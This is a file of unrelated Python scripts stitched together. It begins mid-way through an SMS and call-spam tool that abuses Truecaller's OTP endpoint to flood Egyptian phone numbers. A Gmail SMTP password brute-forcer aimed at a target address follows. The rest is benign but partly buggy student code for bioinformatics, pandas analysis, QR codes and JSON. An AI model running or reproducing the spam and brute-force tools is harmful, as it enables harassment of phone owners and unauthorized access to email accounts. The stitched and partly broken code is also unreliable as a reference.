        url = "https://account-noneu.truecaller.com/v3/sendOnboardingOtp"

        headers = {'Host': 'account-noneu.truecaller.com',
                   'content-type': 'application/json; charset=UTF-8',
                   'content-length': '613',
                   'accept-encoding': 'gzip',
                   'user-agent': 'Truecaller/13.4.7 (Android;10)',
                   'clientsecret': 'lvc22mp3l1sfv6ujg83rd17btt'}

        data = {
            "countryCode": "eg",
            "dialingCode": 20,
            "installationDetails": {
                "app": {
                    "buildVersion": 7,
                    "majorVersion": 13,
                    "minorVersion": 4,
                    "store": "GOOGLE_PLAY"
                },
                "device": {
                    "deviceId": md5,
                    "language": "en",
                    "manufacturer": "samsung",
                    "mobileServices": [
                        "GMS"
                    ],
                    "model": "SM-J700H",
                    "osName": "Android",
                    "osVersion": "10",
                    "simSerials": [
                        "8920022022832702574",
                        "8920018520921472187"
                    ]
                },
                "language": "en",
                "sims": [
                    {
                        "mcc": "602",
                        "mnc": "2",
                        "operator": "vodafone"
                    },
                    {
                        "mcc": "602",
                        "mnc": "1",
                        "operator": "Orange EG"
                    }
                ],
                "storeVersion": {
                    "buildVersion": 7,
                    "majorVersion": 13,
                    "minorVersion": 4
                }
            },
            "phoneNumber": number,
            "region": "region-2",
            "sequenceNo": 1
        }
        try:

            req6 = requests.post(url, headers=headers, json=data).text
            # print(req6)
            if "Sent" in req6:
                print(G + n + "[+]Done send spam call")

            elif "Phone number limit reached" in req6:
                print(R + n + "[-]Error this number limit reached,Try Again After 24 hours")
                call()
            else:
                print(R + n + "[-]Error Try Again")
                call()
        except Exception as t:
            # print(R,t)
            print(R + n + "[-]Failed connect to internet")
            pass

    except ValueError as v:
        # print(v)
        print(R + n + "[-]Error Number Try Again")
        call()
    except Exception as t:
        # print(R,t)
        print(R + n + "[-]Failed connect to internet")


#######==============################

print(n + R + "-This script work only with the Egyptian numbers\n")


#######==============################

def list():
    print(G + f"[1]{A}---> {R}spam sms{W} we")
    print(G + f"[2]{A}---> {R}spam sms {W}orange")
    print(G + f"[3]{A}---> {R}spam sms{W} vodafone")
    print(G + f"[4]{A}---> {R}spam sms{W} All Network")
    print(G + f"[5]{A}---> {R}spam sms{W} All Network +2")
    print(G + f"[6]{A}---> {R}spam call{W} All Network")


list()

#######==============################

choose = input(n + P + "[+]choose:\033[1;37m")

if choose == '1':
    we()

elif choose == '2':
    orange()

elif choose == '3':
    vodafone()

elif choose == '4':
    All1()

elif choose == '5':
    All2()

elif choose == '6':
    call()

else:
    print(R + n + "Error ,  choose from list" + n)
    time.sleep(1)
    os.system('python spam-sms-Egypt.py')
    # import matplotlib.pyplot as plt


# def perBase_AContent(reads):
#     max_len = max(map(len, reads))  # Maximum length among all reads
#
#     positions = list(range(max_len))
#     a_percentages = []
#
#     for i in range(max_len):
#         a_count = sum(1 for read in reads if i < len(read) and read[i] == 'A')
#         a_percentage = (a_count / len(reads)) * 100
#         a_percentages.append(a_percentage)
#
#     plt.plot(positions, a_percentages)
#     plt.xlabel('Position in Read')
#     plt.ylabel("Percentage of 'A'")
#     plt.title("Percentage of 'A' in each position across reads")
#     plt.show()
#
# reads = ['ATCGA', 'AACGT', 'ACCT', 'ATGCAT']
#
# perBase_AContent(reads)

from biopandas.pdb import PandasPdb
import matplotlib.pyplot as plt

ppdb_df = PandasPdb().read_pdb('')

type(ppdb_df.df)

ppdb_df.df.keys()

atom_df = ppdb_df.df['ATOM']
atom_df.head()

het_df = ppdb_df.df['HETATM']
het_df.head()

atom_df['b_factor'].plot(kind='hist')
plt.title('B-Factor of human coronavirus')
plt.xlabel('B-Factor')

atom_df.element_symbol.unique()

atom_df['element_symbol'].value_counts().plot(kind='bar')
plt.title('Element symbol distribution')
plt.ylabel('Count')
plt.xlabel('Element symbol')

atom_df['atom_name'].value_counts().plot(kind='bar', figsize=(10, 8))
plt.title('Atom name distribution')
plt.ylabel('Count')
plt.xlabel('atom_name symbol')

ppdb_df = PandasPdb().read_pdb('/kaggle/input/6lu7.pdb')

catom_df = ppdb_df.df['ATOM']
chtm_df = ppdb_df.df['HETATM']

catom_df.head()

catom_df['element_symbol'].value_counts().plot(kind='bar')
plt.title('Element symbol distribution')
plt.ylabel('Count')
plt.xlabel('Element symbol')

catom_df['atom_name'].value_counts().plot(kind='bar', figsize=(10, 8))
plt.title('Atom name distribution')
plt.ylabel('Count')
plt.xlabel('atom_name symbol')

import qrcode

# Data to be encoded
data = 'https://drive.google.com/drive/folders/1_TQTNeJWl97VbZnAdgXQAHFI4dp1Brqz?usp=sharing'

# Encoding data using make() function
img = qrcode.make(data)

# Saving as an image file
img.save('AGraduation.png')
import smtplib, sys, os, random
from os import system

OKGREEN = '\033[92m'
WARNING = '\033[0;33m'
FAIL = '\033[91m'
ENDC = '\033[0m'
LITBU = '\033[94m'
YELLOW = '\033[3;33m'
CYAN = '\033[0;36'
colors = ['\033[92m', '\033[91m', '\033[0;33m']
RAND = random.choice(colors)

GMAIL_PORT = '587'

def artwork():
    print("\n")
    print(RAND + '''
     ▄████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓     ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
    ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒
   ▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░
   ░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄
   ░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
     ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
      ░   ░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
    ░ ░   ░ ░      ░     ░   ▒    ▒ ░  ░ ░    ░  ░░ ░  ░   ▒   ░        ░ ░░ ░
          ░        ░         ░  ░ ░      ░  ░ ░  ░  ░      ░  ░░ ░      ░  ░
                                                               ░''')
artwork()
smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)

smtp.ehlo()
smtp.starttls()

user = input("While The Target Gmail Adress: ")
pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")

if pwd=='0':
    passswfile="passworld.txt"

elif pwd=='1':
    print("\n")
    passswfile = input("Name The File Path (For Password List):")

else:
    print("\n")
    print("Invalid input! Terminaling...")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtp.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Pasword Is Wrong. %s " % password)
        # import pandas as pd
# import seaborn as sns
# from matplotlib import pyplot as plt
# import numpy as np
# from sqlalchemy.dialects.mssql.information_schema import columns

# #create heapmap for overlapping genes
# fig, ax = plt.subplots(figsize=(8, 6))  # Set the figsize to (width, height)
#
# data=pd.read_csv('overlapped_genes_562', delim_whitespace=True)
# #set gene names as index
# print(data)
# data = data.set_index(data.columns[0])
# heat_map = sns.heatmap(data,vmin=0, vmax=1,cmap="coolwarm",linewidths=.00000000006)

# heat_map =sns.heatmap(data, vmin=0, vmax=1, annot=True, fmt='.2f', cmap='RdYlGn', ax=ax, annot_kws={'fontsize': 8}) #add values to heatmap but it doesnot show properly
#
# plt.tight_layout()
# plt.show()
#
# #have tried
# plt.gca().set_aspect(0.9) #to adjust size of cell but it doesnot work

# df = pd.read_csv('overlapped_genes_562', delim_whitespace=True)
# print(df)
# genes = (np.asarray(df['Gene']).reshape(561, 3))
# c1 = np.asarray(df['C1']).reshape(561, 3)
# result = df.pivot(index='Yrows', columns='Xcols', values='C1')
# labels = (np.asarray(["{0} \n {1:.2f}".format(genes, c1)
#                       for symb, value in zip(genes.flatten(),
#                                              c1.flatten())])
#           ).reshape(561, 3)
# fig, ax = plt.subplots(figsize=(561,3))
#
# # Add title to the Heat map
# title = "Pharma Sector Heat Map"
#
# # Set the font size and the distance of the title from the plot
# plt.title(title,fontsize=18)
# ttl = ax.title
# ttl.set_position([0.5,1.05])
#
# # Hide ticks for X & Y axis
# ax.set_xticks([])
# ax.set_yticks([])
#
# # Remove the axes
# ax.axis('off')
#
# sns.heatmap(result,annot=labels,fmt="",cmap='RdYlGn',linewidths=0.30,ax=ax)

# Display the Pharma Sector Heatmap
# plt.show()
# symbol = ((np.asarray(df['Symbol'])).reshape(6,5))
# perchange = ((np.asarray(df['Change'])).reshape(6,5))

import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt
import math

well_data = pd.read_csv('overlapped_genes_562', delim_whitespace=True)
well_data = well_data[['Gene', 'C1', 'N1']]
well_data = well_data.set_index(well_data.columns[0])


corr = well_data.corr()
sns.heatmap(corr)
heat_map = sns.heatmap(well_data, vmin=0, vmax=1, cmap="coolwarm",
                           linewidths=.00000000006, yticklabels='auto', annot=True, fmt='.2f', cbar=False,
                           annot_kws={'fontsize': 8,'fontweight':'bold'})

splitter_init = int(input("Please enter how many genes per heatmap: "))  # How many genes per heatmap
start_splitter = 0

if (562 % splitter_init) == 0:

    r = 562 / splitter_init

else:

    r = math.ceil(562 / splitter_init) + 1

splitter = splitter_init
for i in range(r):
    heat_map = sns.heatmap(well_data.iloc[start_splitter:splitter, :], vmin=0, vmax=1, cmap="coolwarm",
                           linewidths=.00000000006, yticklabels='auto', annot=True, fmt='.2f', cbar=False,
                           annot_kws={'fontsize': 8,'fontweight':'bold'})

    plt.tight_layout()
    plt.show()
    start_splitter = start_splitter + splitter_init
    splitter = splitter + splitter_init

# sns.heatmap(corr, cmap='RdBu')
# sns.heatmap(corr, cmap='RdBu', vmin=-1, vmax=1)
# sns.heatmap(corr, cmap='RdBu', vmin=-1, vmax=1, annot=True)
# sns.heatmap(corr, cmap='RdBu', vmin=-1, vmax=1, annot=True,
#             annot_kws={'fontsize':11, 'fontweight':'bold'})
# sns.heatmap(corr, cmap='RdBu', vmin=-1, vmax=1, annot=True,
#             annot_kws={'fontsize':11, 'fontweight':'bold'},
#            square=True)

# from Bio.PDB import PDBParser
#
# def read_pdb_file(pdb_file):
#     parser = PDBParser()
#     structure = parser.get_structure('my_structure', pdb_file)
#
#     # Extract relevant information from the structure
#     coordinates = []
#     velocities = []
#     atom_types = []
#     connectivity = []
#
#     for model in structure:
#         for chain in model:
#             for residue in chain:
#                 for atom in residue:
#                     # Extract coordinates
#                     coordinates.append(atom.get_coord())
#
#                     # Extract velocities (if available in the PDB file)
#                     # Note: Velocity information is not commonly provided in PDB files
#                     velocities.append(atom.get_vector().get_array())
#
#                     # Extract atom type
#                     atom_types.append(atom.get_name())
#
#                     # Extract connectivity information (e.g., bonds)
#                     # Note: PDB files may not contain explicit connectivity information
#                     #       and you may need additional methods to infer connectivity.
#                     connectivity.append(get_connectivity(atom))
#
#     return coordinates, velocities, atom_types, connectivity
#
# def get_connectivity(atom):
#     # Implement your connectivity inference method here
#     # This can be based on atomic distances, residue information, etc.
#     # Example: Assume all atoms in the same residue are connected
#     residue = atom.get_parent()
#     residue_atoms = [a.get_name() for a in residue]
#     return residue_atoms
#
# # Usage example
# pdb_file = 'pddbb/complexCID.pdb'
# coordinates, velocities, atom_types, connectivity = read_pdb_file(pdb_file)
#
# # Print the extracted information
# print('Coordinates:', coordinates)
# print('Velocities:', velocities)
# print('Atom Types:', atom_types)
# print('Connectivity:', connectivity)
# import biopandas.pdb as bpd
#
# def read_pdb_file(pdb_file):
#     pdb_data = bpd.PandasPdb().read_pdb(pdb_file)
#
#     # Extract atom information
#     atom_info = pdb_data.df['ATOM'][['atom_name', 'residue_name', 'residue_number', 'chain_id', 'x_coord', 'y_coord', 'z_coord']]
#     atom_info = atom_info.to_dict('records')
#
#     return atom_info
#
# # Example usage
# pdb_file = 'pddbb/complexCID.pdb'
# atoms = read_pdb_file(pdb_file)
#
# # Access the extracted information
# for atom in atoms:
#     print(atom['atom_name'], atom['residue_name'], atom['residue_number'], atom['chain_id'], atom['x_coord'], atom['y_coord'], atom['z_coord'])


import pandas as pd

df = pd.read_csv("Project+1+-+Weather+Dataset.csv")
print(df.nunique())
print(df['Wind Speed_km/h'].nunique())
print(df['Wind Speed_km/h'].unique())
print(df['Weather'].value_counts())
print(df[df.Weather == 'Clear'])
print(df.groupby('Weather').get_group('Clear'))
print(df[df['Wind Speed_km/h'] == 4])
print(df.isnull().sum())
print(df.notnull().sum())
df.rename(columns={'Weather': 'Weather Conditions'}, inplace=True)
print(df.columns)
print(df.Visibility_km.mean())
print(df.Press_kPa.std())
print(df['Rel Hum_%'].var())
print(df['Weather Conditions'].value_counts())
print(df[df['Weather Conditions'] == 'Snow'])
print(df[df['Weather Conditions'].str.contains('Snow')].tail(50))
print(df[(df['Wind Speed_km/h'] > 24) & (df['Visibility_km'] == 25)])
print(df.groupby('Weather Conditions').mean(numeric_only=True))
print(df.groupby('Weather Conditions').min(numeric_only=True))
print(df.groupby('Weather Conditions').max(numeric_only=True))
print(df[df['Weather Conditions'] == 'Fog'])
print(df[(df['Weather Conditions'] == 'Clear') | (df['Visibility_km'] > 40)])
print(df[(df['Weather Conditions'] == 'Clear') & (df['Rel Hum_%'] > 50) | (df['Visibility_km'] > 40)])

import pandas as pd
import statsmodels.api as sm
from scipy.stats import ttest_ind

df=pd.read_csv('AssignmentData.csv')
print(df.isnull().sum())
print(df.notnull().sum())
print(df.isnull().mean())
print(df.notnull().mean())
cols=df.columns
for i in cols:
    df[i]=df[i].fillna("")
print(df.isnull().sum())

y = df['GDP']
x = df['Political Context_WPFI']
x = sm.add_constant(x)
model = sm.OLS(y, x).fit()
print(model.summary())

r2 = model.rsquared
print("Coefficient of determination (R-squared):", r2)
# Interpret the coefficients of the independent variables
coefficients = model.params[1:]
print("Coefficients of the independent variables:")
for i in range(len(coefficients)):
    print(x.columns[i+1], ":", coefficients[i])

# y2=df['Score_WPFI']
# x2=df['Legal Framework_WPFI']
# x2 = sm.add_constant(x2)
# model2 = sm.OLS(y2, x2).fit()
# print(model2.summary())

group1 = df[df['Safety Score_WPFI'] == 1]['Safety Score_WPFI']
group2 = df[df['Score_WPFI'] == 2]['Score_WPFI']

# Conduct a two-sample t-test assuming unequal variances
t_stat, p_val = ttest_ind(group1, group2, equal_var=False)

# Print the results
print('Test statistic: ', t_stat)
print('p-value: ', p_val)

# Interpret the results
alpha = 0.05  # significance level
if p_val < alpha:
    print('Reject null hypothesis - there is a significant difference between the two groups.')
else:
    print('Fail to reject null hypothesis - there is no significant difference between the two groups.')

import pandas as pd

df=pd.read_csv("Project+2+-+Cars+Dataset.csv")
print(df.shape)

# print(df.isnull().sum())
df['Make'].fillna(df['Make'].mode(), inplace=True)
df['Model'].fillna(df['Model'].mode(), inplace=True)
df['Type'].fillna(df['Type'].mode(), inplace=True)
df['Origin'].fillna(df['Origin'].mode(), inplace=True)
df['DriveTrain'].fillna(df['DriveTrain'].mode(), inplace=True)
df['MSRP'].fillna(df['MSRP'].mode()[0], inplace=True)
df['Invoice'].fillna(df['Invoice'].mode(), inplace=True)
df['EngineSize'].fillna(df['EngineSize'].mean(), inplace=True)
df['Cylinders'].fillna(df['Cylinders'].mean(), inplace=True)
df['Horsepower'].fillna(df['Horsepower'].mean(), inplace=True)
df['MPG_City'].fillna(df['MPG_City'].mean(), inplace=True)
df['MPG_Highway'].fillna(df['MPG_Highway'].mean(), inplace=True)
df['Weight'].fillna(df['Weight'].mean(), inplace=True)
df['Wheelbase'].fillna(df['Wheelbase'].mean(), inplace=True)
df['Length'].fillna(df['Length'].mean(), inplace=True)
print(df.isnull().sum())
print(df)
print(df['Make'].value_counts())
print(df[df['Origin'].isin(['Asia', 'Europe'])])
print(df['Origin'].value_counts())
df2=df[~(df['Weight']>4000)]
print(df2)
print(df2.shape)
df3= df['MPG_City'] =  df['MPG_City'].apply(lambda x:x+3)
print(df3)


import pandas as pd

df=pd.read_csv('DATA1.csv')
# Find the duplicated values in the 'Name' column

duplicated_rows = df[df.duplicated(subset=['gene_assignment'], keep=False)]

print(duplicated_rows)
# # Get all rows with duplicated values in the 'Name' column
# for i in duplicated_names:
#     if i != '---':
#         print(i)

# print(duplicated_names)
# for i in duplicated_names:
#     if i != '---':
#         df[i]= i
from textblob import TextBlob

b = TextBlob("This is a test")
translated = b.translate(to="ar", from_lang="en")
print(translated)
# import numpy as np
#
# newdata = np.random.random((50, 4))
# np.savetxt('newdata.csv', newdata, fmt="%.2f", delimiter=",", header='H1,H2,H3,H4')
# read = np.loadtxt('newdata.csv', delimiter=",")
# print(read[:4,:])

# import pickle
#
# order = {"first": 1, "second": 2, "third": 3, "fourth": 4, "fifth": 5}
# pickle.dump(order, open('new.pkl', "wb"))
# pick = pickle.load(open('new.pkl', "rb"))
# print(pick)

import json

college = {"college": "Engineering College",
           "objectives": "Mastering Electrical and Computer Engineering",
           "department": {
               "dep1": "Electrical",
               "dep2": "Computer"
           },
           "years": ["year1", "year2", "year3", "year4"],
           "number": [1, 2, 3, 4],
           "ID": [10, 20, 30, 40]
}
json.dump(college,open("college.json","w"))
new_college = json.load(open("college.json","r"))
print(new_college)
# import os

# # Define input and output files
# receptor_file = "receptor.pdbqt"
# ligand_file = "ligand.pdbqt"
# trajectory_file = "trajectory.xtc"
# topology_file = "topology.tpr"
# admet_input_file = "ligand.sdf"
# admet_output_file = "admet_results.txt"
#
# # Define Autodock Vina parameters
# vina_command = "vina"
# vina_config_file = "vina_config.txt"
# vina_output_file = "vina_results.txt"
# vina_num_modes = 10
#
# # Define GROMACS parameters
# gmx_command = "gmx"
# gmx_em_input_file = "em.mdp"
# gmx_md_input_file = "md.mdp"
# gmx_output_file = "gromacs_results.txt"
# gmx_equilibration_steps = 10000
# gmx_production_steps = 100000
#
# # Define ADMETlab parameters
# admetlab_command = "admetlab"
# admetlab_properties = "all"
#
# # Define Autodock Vina command
# vina_cmd = f"{vina_command} --config {vina_config_file} --receptor {receptor_file} --ligand {ligand_file} --out {vina_output_file} --num_modes {vina_num_modes}"
#
# # Define GROMACS commands
# gmx_em_cmd = f"{gmx_command} grompp -f {gmx_em_input_file} -c {ligand_file} -p {receptor_file} -o {topology_file}"
# gmx_em_cmd += f" && {gmx_command} mdrun -v -deffnm em -nt 1"
# gmx_md_cmd = f"{gmx_command} grompp -f {gmx_md_input_file} -c em.gro -p {receptor_file} -o {topology_file}"
# gmx_md_cmd += f" && {gmx_command} mdrun -v -deffnm md -nt 1"
# gmx_rmsd_cmd = f"{gmx_command} rms -s {receptor_file} -f {trajectory_file} -o rmsd.xvg"
# gmx_rmsf_cmd = f"{gmx_command} rmsf -s {receptor_file} -f {trajectory_file} -o rmsf.xvg"
#
# # Define ADMETlab command
# admetlab_cmd = f"{admetlab_command} predict -i {admet_input_file} -p {admetlab_properties} -o {admet_output_file}"
#
# # Run Autodock Vina
# os.system(vina_cmd)
#
# # Run GROMACS
# os.system(gmx_em_cmd)
# os.system(gmx_md_cmd)
# os.system(gmx_rmsd_cmd)
# os.system(gmx_rmsf_cmd)
#
# # Run ADMETlab
# os.system(admetlab_cmd)
import itertools

def TotalDistance(pattern, DNA):
    distance = 0
    for dna in DNA:
        hamming = len(dna)
        for i in range(len(dna)-len(pattern)+1):
            subseq = dna[i:i+len(pattern)]
            hamming_temp = sum(1 for a, b in zip(subseq, pattern) if a != b)
            if hamming_temp < hamming:
                hamming = hamming_temp
        distance += hamming
    return distance

def combination_generator(possibilities, strlen):
    yield from itertools.product(*([possibilities] * strlen))

def MedianStringSearch(DNA, L):
    bestWord = 'A'*L
    bestDistance = float('inf')
    for i in combination_generator('ACGT', L):
        pattern = ''.join(i)
        distance = TotalDistance(pattern, DNA)
        if distance < bestDistance:
            bestDistance = distance
            bestWord = pattern
    return bestWord

DNA = ['ATCAGTCTTA', 'AGTCTAATTC', 'CCGTCAGTCT', 'TTTCAGTCTT']
t = 5
n = 10
L = 5

pattern = MedianStringSearch(DNA, L)
print(pattern)
import gzip
import pandas as pd
import os

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe
"""


def read_vcf(filename):
    print(filename)
    f = None
    if filename.endswith('.vcf.gz'):
        f = open(filename, 'rt',errors="ignore")
    header = []
    data1 = []
    data2 = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            data2.append(line)
        else:
            data1.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data1 = [line.split('\t') for line in data1]
    dataframe = pd.DataFrame(data1, columns=header)
    return dataframe, data2


"""
    this function get dataframe and convert it to dictionary
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return : dict() that has the key and value for comparing
"""


def dictionary(dataframe):
    return dataframe[['POS', 'INFO']].set_index('POS').to_dict()['INFO']


"""
    this function get dataframe and position numbers after comparing to get them from the dataframe
        input:
            :param Data - pandas dataframe : vcf data
            :param Position - position numbers : list of positions numbers
        output:
            :return : dataframe that has the target positions
"""


def returnToDataFrame(dataframe, position):
    return dataframe[dataframe['INFO'].isin(position)]


"""
    this function get dictionary of the dataframe and splitting and compare the condition that has the target DP
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return : dataframe that has the target DP
"""


def splittingAndComparing(dic):
    matched_data = set()
    for key, value in dic.items():
        data_dictionary = {}
        for item in value.split(';'):
            split_item = item.split('=')
            if len(split_item) == 2:
                data_dictionary[split_item[0]] = split_item[1]

        if int(data_dictionary.get('DP', '30')) >= 30:
            matched_data.add(value)

    return matched_data


"""
    this function write the target vcf data
        input:
            :param data_frame - pandas dataframe
            :param filename - the new filename for the target vcf
            :param rest_data - the rest of the data in the file
        output:
            :return : vcf file
"""


def write_vcf(data_frame, filename, rest_data):
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'wt')
    else:
        f = open(filename, 'w')
    header = ''.join([i for i in rest_data])
    f.write(header)
    for index, row in data_frame.iterrows():
        f.write('\t'.join(row.values.tolist()) + '\n')
    f.close()


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            :return : list of files that in the target directory
"""


def getDirectory(directory_name):
    vcf_files = [file for file in os.listdir(directory_name)
                 if file.endswith('.vcf.gz')]
    return vcf_files


"""
    this function call the all functions take  only the directory
        input:
            :param directory_name - directory name
        output:
            write the file with the same name with counter
"""


def main(dictionary_name):
    for i in range(len(getDirectory(dictionary_name))):
        df, data = read_vcf(os.path.join(dictionary_name, getDirectory(dictionary_name)[i]))
        write_vcf(returnToDataFrame(df, splittingAndComparing(dictionary(df))),
                  getDirectory(dictionary_name)[i] + '(' + str(i) + ')' + '.vcf', data)


"""

    calling all the functions in main

"""

if __name__ == '__main__':
    main('VCF files/')

import gzip
import pandas as pd

"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe 
"""


"""
    this function read file vcf and return it to dataframe
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return vcf : vcf as dataframe
"""


def read_vcf(filename):
    print(filename)
    if filename.endswith('.vcf.gz'):
        try:
            f = gzip.open(filename, 'rt', encoding='utf-8')
            # Check the gzip header to confirm if the file is valid
            f.read(1)
            f.seek(0)
        except OSError:
            f = open(filename, 'r', encoding='utf-8')
    elif filename.endswith('.vcf'):
        f = open(filename, 'r', encoding='utf-8')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))

    header = []
    data1 = []
    data2 = []
    for line in f:
        if line.startswith('#CHROM'):
            header.append(line.strip())
        if line.startswith('#'):
            data2.append(line)
        else:
            data1.append(line.strip())
    f.close()
    header = header[0].split('\t')
    data1 = [line.split('\t') for line in data1]
    dataframe = pd.DataFrame(data1, columns=header)
    return dataframe, data2


"""
    this function get dataframe and convert it to dictionary
        input:
            :param Data - pandas dataframe : vcf data 
        output:
            :return : dict() that has the key and value for comparing 
"""

def dictionary(dataframe):
    dic = dict()
    for i, index in enumerate(dataframe.index.tolist()):
        dic[index] = dataframe.iloc[i]['INFO']
    return dic

"""
    this function get dataframe and position numbers after comparing to get them from the dataframe
        input:
            :param Data - pandas dataframe : vcf data
            :param Position - position numbers : list of positions numbers
        output:
            :return : dataframe that has the target positions 
"""


def returnToDataFrame(dataframe, position):
    return dataframe.iloc[position]


"""
    this function get dictionary of the dataframe and splitting and compare the condition that has the target positions
        input:
            :param Data - pandas dataframe : vcf data
        output:
            :return : dataframe that has the target positions 
"""


def splittingAndComparing(dic):
    matched_data = []
    for key, value in dic.items():
        data_dictionary = {}
        for item in value.split(';'):
            split_item = item.split('=')
            if len(split_item) == 2:
                data_dictionary[split_item[0]] = split_item[1]

        if int(data_dictionary.get('DP', '30')) >= 30:
            matched_data.append(key)

    return matched_data


"""
    this function write the target vcf data
        input:
            :param data_frame - pandas dataframe
            :param filename - the new filename for the target vcf
            :param rest_data - the rest of the data in the file
        output:
            :return : vcf file 
"""


def write_vcf(data_frame, filename, rest_data):
    if filename.endswith('.gz'):
        f = gzip.open(filename, 'wt')
    else:
        f = open(filename, 'w')
    header = ''.join([i for i in rest_data])
    f.write(header)
    for index, row in data_frame.iterrows():
        f.write('\t'.join(row.values.tolist()) + '\n')
    f.close()


"""

 calling all the functions in main
 
"""

if __name__ == '__main__':
    df, data = read_vcf('VCF files/A1_T1_filtered.vcf.gz')  # ('.vcf.gz') or ('.vcf')
    write_vcf(returnToDataFrame(df, splittingAndComparing(dictionary(df))), 'A_T1_filtered.vcf', data)
    import numpy as np
from collections import Counter
import random
from math import log2


class RawDNA:
    def __init__(self, file_name):
        self.file_name = file_name
        self.t, self.n, self.length, self.sequence = 0, 0, 0, []
        self.readDnaFile()
        # self.seqs=self.generate_random_sequences()
        self.out = self.getConsensusString(self.branchAndBoundMedianString()).upper()

    def readDnaFile(self):
        with open(self.file_name, 'r') as file:
            self.t, self.n, self.L = map(int, file.readline().split())
            self.sequence = [file.readline().strip() for _ in range(self.t)]

    def generate_random_sequences(self):
        nucleotides = ['A', 'C', 'G', 'T']
        sequence_arr = [''.join(random.choices(nucleotides, k=self.n)) for _ in range(self.t)]
        return sequence_arr

    def hamming_distance(self, s1, s2):
        return sum(c1 != c2 for c1, c2 in zip(s1, s2))

    def branchAndBoundMedianString(self):
        best_score = float('inf')
        best_alignment = None

        def backTrack(pattern, score, indices):
            nonlocal best_score, best_alignment
            if len(pattern) == self.length:
                if score < best_score:
                    best_score = score
                    best_alignment = (pattern, indices)
            else:
                for nucleotide in ['A', 'C', 'G', 'T']:
                    new_pattern = pattern + nucleotide
                    new_score = sum(
                        self.hamming_distance(new_pattern, sequence[i:i + self.length]) for sequence, i in
                        zip(self.sequance, indices))
                    if new_score < best_score:
                        new_indices = [i + 1 for i in indices]
                        backTrack(new_pattern, new_score, new_indices)

        for i in range(len(self.sequance[0]) - self.length + 1):
            pattern = self.sequance[0][i:i + self.length]
            score = sum(self.hamming_distance(pattern, sequence[i:i + self.length]) for sequence in self.sequance[1:])
            indices = [i + 1] + [1] * (self.t - 1)
            backTrack(pattern, score, indices)

        return best_alignment

    def getConsensusString(self, alignment):
        return alignment[0]

    def printFunc(self):
        print("Multiple Alignment:")
        for i, s in enumerate(self.sequence):
            print(s[self.branchAndBoundMedianString()[1][i]:
                    self.branchAndBoundMedianString()[1][i] + self.length])
        print("Starting Indices: ", self.branchAndBoundMedianString()[1])
        print("Consensus String: ", self.out)


class Pssmd:
    def __init__(self, file_name):
        self.file_name = file_name
        self.sequence = input('enter your sequance')
        self.num_seq, lenseq, self.seqs = 0, 0, []
        self.read_data()
        self.printseqs = self.print_seqs()
        self.printpss = self.print_pssm(self.calc_pssm())
        print(self.calc_prob(self.sequence, self.calc_pssm()))

    def read_data(self):
        with open(self.file_name, 'r') as file:
            self.num_seq, self.lenseq = map(int, file.readline().split())
            self.seqs = [file.readline().strip() for _ in range(self.num_seq)]

    def print_seqs(self):
        print("Aligned Sequences:")
        for seq in self.seqs:
            print(seq)

    def calc_pssm(self):
        t = len(self.seqs)
        n = len(self.seqs[0])
        pssm_matrix = [[0] * 4 for _ in range(n)]
        for i in range(n):
            column = [sequence[i] for sequence in self.seqs]
            for j in range(4):
                count = column.count('ACGT'[j])
                pssm_matrix[i][j] = count / t
        for index, row in enumerate(list(zip(*pssm_matrix))):
            pssm_matrix[index] = [log2(val / ((sum(row) * t) / t * n)) if val != 0 else 0 for val in row]

        return pssm_matrix

    def print_pssm(self, pssm):
        print("\nPSSM Matrix:")
        for row in pssm:
            print(' '.join(f'{value:.2f}' for value in row))

    def calc_prob(self, pssm):
        prob = 0
        self.sequence = self.sequence.upper()
        for i, nuc in enumerate(self.sequence):
            if nuc in 'ACGT':
                index = 'ACGT'.index(nuc)
                prob += pssm[index][i]
        print(round(prob, 2))

if __name__ == 'main':
    RawDNA('compBioAssignment/rawDNA.txt').printFunc()
    Pssmd('compBioAssignment/PSSMData.txt')

# import numpy as np
# import matplotlib.pyplot as plt
# from Bio.PDB import PDBParser
#
# def calculate_rmsd(coords1, coords2):
#     """Calculate the Root Mean Square Deviation (RMSD) between two sets of coordinates."""
#     diff = coords1 - coords2
#     rmsd = np.sqrt(np.mean(np.sum(diff ** 2, axis=1)))
#     return rmsd
#
# def calculate_rmsf(coords):
#     """Calculate the Root Mean Square Fluctuation (RMSF) for each atom in a set of coordinates."""
